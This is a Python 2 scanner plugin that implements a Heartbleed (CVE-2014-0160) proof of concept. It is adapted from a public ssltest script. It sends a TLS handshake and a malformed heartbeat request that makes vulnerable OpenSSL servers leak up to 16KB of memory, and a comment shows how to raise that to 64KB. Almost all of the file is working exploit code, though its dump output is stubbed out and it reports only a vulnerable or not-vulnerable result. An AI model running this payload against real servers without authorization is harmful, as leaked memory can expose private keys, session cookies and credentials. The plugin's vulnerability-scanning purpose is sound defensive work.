# coding=utf-8
'''
heartbleed_openssl.py

Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)

Modified by Derek Callaway (decal@ethernet.org) to add STARTTLS protocols

The authors disclaim copyright to this source code.

https://raw.githubusercontent.com/decal/ssltest-stls/master/ssltest-stls.py
'''

from __future__ import with_statement

import sys

from teye_web.http.URL import URL
from teye_poc.PocScan import PocScan
from LogManager import log
import struct
import socket
import select
import time

OPENSSL_HELLO = '''
16 03 02 00 dc 01 00 00  d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
'''

# 01 40 00----dump16kb
# 01 ff ff----dump64kb
OPENSSL_HB = ''' 
18 03 02 00 03
01 40 00
'''


class openssl_heartbleed(PocScan):
    '''
	'''

    def __init__(self):
        '''
		'''
        self._poc_info = {

            'w_hat': {
                'author': u"imiyoo",
                'blog': u"http://www.imiyoo.com",
                'team': u"W.A.T",
                'create_time': u"2014-11-21"
            },
            'w_vul': {
                'id': u"WDB-2014-1002",
                'title': u"OpenSSL心脏滴血漏洞",
                'method': "TCP",
                'tag': u"openssl",
                'rank': u"高危",
                'info': u"http://www.watscan.com/",
                'references': ['https://raw.githubusercontent.com/decal/ssltest-stls/master/ssltest-stls.py']
            }
        }

    def check(self, url):
        '''
		'''

        log.info(u'正在检测 %s 是否存在openssl漏洞...' % url.get_host())

        domain = url.get_host()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.settimeout(2)

        try:
            s.connect((domain, 443))

        except Exception, e:

            return None

        s.send(self.h2bin(OPENSSL_HELLO))

        while True:
            typ, ver, pay = self.recvmsg(s)

            if typ == None:
                return None

            if typ == 22 and ord(pay[0]) == 0x0E:
                break

        s.send(self.h2bin(OPENSSL_HB))

        flag = self.hit_hb(s, domain)

        if flag:
            log.info(self._poc_info["w_vul"]["title"])
            self.security_hole(domain)
        else:
            log.info(u"没有发现漏洞")

    def h2bin(self, data):
        '''
		'''
        return data.replace(' ', '').replace('\n', '').decode('hex')

    def hexdump(self, s):
        for b in xrange(0, len(s), 16):
            lin = [c for c in s[b: b + 16]]
            hxdat = ' '.join('%02X' % ord(c) for c in lin)
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)

    def recvall(self, s, length, timeout=5):
        '''
		'''
        endtime = time.time() + timeout

        rdata = ''

        remain = length

        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)

            if s in r:
                try:
                    data = s.recv(remain)

                except Exception, e:

                    return None

                if not data:
                    return None

                rdata += data

                remain -= len(data)

        return rdata

    def recvmsg(self, s):
        '''
		'''
        hdr = self.recvall(s, 5)

        if hdr is None:
            return None, None, None

        typ, ver, ln = struct.unpack('>BHH', hdr)

        pay = self.recvall(s, ln, 10)

        if pay is None:
            return None, None, None

        return typ, ver, pay

    def hit_hb(self, s, domain):
        '''
		'''

        s.send(self.h2bin(OPENSSL_HB))

        while True:
            typ, ver, pay = self.recvmsg(s)

            if typ is None:
                return False

            if typ == 24:
                self.hexdump(pay)

                if len(pay) > 3:
                    return True
                else:
                    return False

            if typ == 21:
                self.hexdump(pay)
                return False


if __name__ == "__main__":
    '''
	>>> openssl_check = openssl_heartbleed()
	>>> openssl_check.check(URL("42.96.151.146"))
	'''
    from optparse import OptionParser

    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-u", "--url", action="store", dest="url", default=None, help="Scan the target(domain/ip)")
    (options, args) = parser.parse_args()
    if not options.url:
        parser.print_help()
        sys.exit(-1)
    else:
        url = options.url
        target_url = URL(url)
        check_inst = openssl_heartbleed()
        check_inst.check(target_url)
